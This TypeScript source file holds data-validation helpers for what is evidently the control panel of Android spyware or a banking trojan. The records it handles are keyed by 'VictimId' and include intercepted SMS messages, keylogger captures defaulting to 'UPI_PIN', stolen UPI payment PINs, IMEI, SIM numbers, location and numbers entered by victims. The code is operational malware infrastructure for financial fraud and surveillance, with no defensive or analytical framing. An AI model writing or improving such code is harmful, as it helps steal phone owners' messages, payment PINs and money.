import { DeviceInfo, Message, SimRow, KeyLog, UserEntered } from '@/data/db';

// Data validation utilities to prevent data loss
export const validateDeviceInfo = (device: any): DeviceInfo | null => {
  if (!device || typeof device !== 'object') return null;
  
  return {
    Status: device.Status || 'Unknown',
    AndroidVersion: device.AndroidVersion || 'Unknown',
    IP: device.IP || device.IPAddress || 'Unknown',
    IPAddress: device.IPAddress || device.IP || 'Unknown',
    UPIPin: device.UPIPin || 'No Pin',
    Note: device.Note || '',
    // Support both Added (legacy) and AddedTime (from Firebase)
    Added: device.Added || device.AddedTime || '',
    AppsInstalled: device.AppsInstalled || '0',
    Battery: device.Battery || device.BatteryLevel || '100%',
    BatteryLevel: device.BatteryLevel || device.Battery || '100%',
    Brand: device.Brand || 'Unknown',
    Model: device.Model || 'Unknown',
    // Add missing SIM and Service fields
    ServiceName1: device.ServiceName1 || 'Unknown',
    ServiceName2: device.ServiceName2 || 'Unknown',
    SimNumber1: device.SimNumber1 || 'Unknown',
    SimNumber2: device.SimNumber2 || 'Unknown',
    SDKVersion: device.SDKVersion || 'Unknown',
    IMEI: device.IMEI || 'Unknown',
    VictimId: device.VictimId || 'Unknown',
    Location: device.Location || 'Unknown',
    LastSeen: device.LastSeen || new Date().toISOString()
  };
};

export const validateMessage = (message: any): Message | null => {
  if (!message || typeof message !== 'object') return null;

  // Accept common variants from different producers
  const VictimId = message.VictimId || message.VictimID || message.DeviceId || message.DeviceID;
  const Sender = message.Sender || message.From || message.Number || message.PhoneNumber;
  const Time = message.Time || message.TimeStamp || message.Timestamp || message.DateTime;
  const Body = message.Body || message.Message || message.Text || '';
  const Type = message.Type || (message.SmsType === 'SENT' ? 'Sent' : message.SmsType === 'RECEIVED' ? 'Received' : message.SmsType);

  if (!VictimId || !Sender || !Time) return null;

  return {
    VictimId,
    Sender,
    Recipient: message.Recipient || message.To || '',
    Time,
    Body,
    Message: message.Message || Body,
    SmsType: message.SmsType || 'UNKNOWN',
    Type: Type || 'Received'
  };
};

export const validateSimRow = (sim: any): SimRow | null => {
  if (!sim || typeof sim !== 'object') return null;
  
  return {
    slot: sim.slot || 0,
    carrier: sim.carrier || 'Unknown',
    number: sim.number || 'Unknown'
  };
};

export const validateKeyLog = (log: any): KeyLog | null => {
  if (!log || typeof log !== 'object') return null;
  
  // Check for new column structure
  if (log.Column1 !== undefined) {
    return {
      timestamp: log.timestamp || log.time || '',
      Column1: log.Column1,
      Column2: log.Column2,
      Column3: log.Column3,
      Column4: log.Column4,
      Column5: log.Column5,
      Column6: log.Column6
    };
  }
  
  // Check for legacy structure
  if (log.time && log.text) {
    return {
      time: log.time,
      text: log.text
    };
  }
  
  return null;
};

// Batch validation functions
export const validateDevices = (devices: any): Record<string, DeviceInfo> => {
  if (!devices || typeof devices !== 'object') return {};
  
  const validated: Record<string, DeviceInfo> = {};
  
  for (const [id, device] of Object.entries(devices)) {
    const validDevice = validateDeviceInfo(device);
    if (validDevice) {
      validated[id] = validDevice;
    }
  }
  
  return validated;
};

export const validateMessages = (messages: any): Record<string, Message> => {
  if (!messages || typeof messages !== 'object') return {};

  const validated: Record<string, Message> = {};

  // Recursively walk nested objects and collect valid messages at any depth
  const walk = (node: any, prefix: string[] = []) => {
    if (!node || typeof node !== 'object') return;

    // Try to validate this node as a message
    const maybeMsg = validateMessage(node);
    if (maybeMsg) {
      const id = prefix.join('/') || 'unknown';
      validated[id] = maybeMsg;
      return; // Treat as leaf
    }

    // Otherwise, descend into children
    for (const [key, value] of Object.entries(node)) {
      // Safety: only traverse objects
      if (value && typeof value === 'object') {
        walk(value, [...prefix, key]);
      }
    }
  };

  walk(messages, []);

  return validated;
};

export const validateSims = (sims: any[]): SimRow[] => {
  if (!Array.isArray(sims)) return [];
  
  return sims
    .map(validateSimRow)
    .filter((sim): sim is SimRow => sim !== null);
};

export const validateKeyLogs = (keyLogs: any[]): KeyLog[] => {
  if (!Array.isArray(keyLogs)) return [];
  
  return keyLogs
    .filter(log => log && typeof log === 'object')
    .map(log => ({
      keylogger: log.keylogger || 'UPI_PIN',
      timestamp: log.timestamp || log.time || new Date().toISOString(),
      Column1: log.Column1 || '',
      Column2: log.Column2 || '',
      Column3: log.Column3 || '',
      Column4: log.Column4 || '',
      Column5: log.Column5 || '',
      Column6: log.Column6 || '',
      // Legacy support
      time: log.time || log.timestamp,
      text: log.text || ''
    }));
};

export const validateUserEntered = (entry: any): UserEntered | null => {
  if (!entry || typeof entry !== 'object') return null;
  if (!entry.NumberEntered || !entry.VictimID) return null;
  
  return {
    NumberEntered: entry.NumberEntered,
    VictimID: entry.VictimID,
    Time: entry.Time || new Date().toISOString()
  };
};

export const validateUserEnteredData = (entries: any): Record<string, UserEntered> => {
  if (!entries || typeof entries !== 'object') return {};
  
  const validated: Record<string, UserEntered> = {};
  
  for (const [id, entry] of Object.entries(entries)) {
    const validEntry = validateUserEntered(entry);
    if (validEntry) {
      validated[id] = validEntry;
    }
  }
  
  return validated;
};

export const validateUPIPins = (pins: any): Array<{ pin: string; timestamp: string }> => {
  if (!Array.isArray(pins)) return [];
  
  return pins
    .filter(pin => pin && typeof pin === 'object' && pin.pin)
    .map(pin => ({
      pin: String(pin.pin),
      timestamp: pin.timestamp || new Date().toISOString()
    }));
};
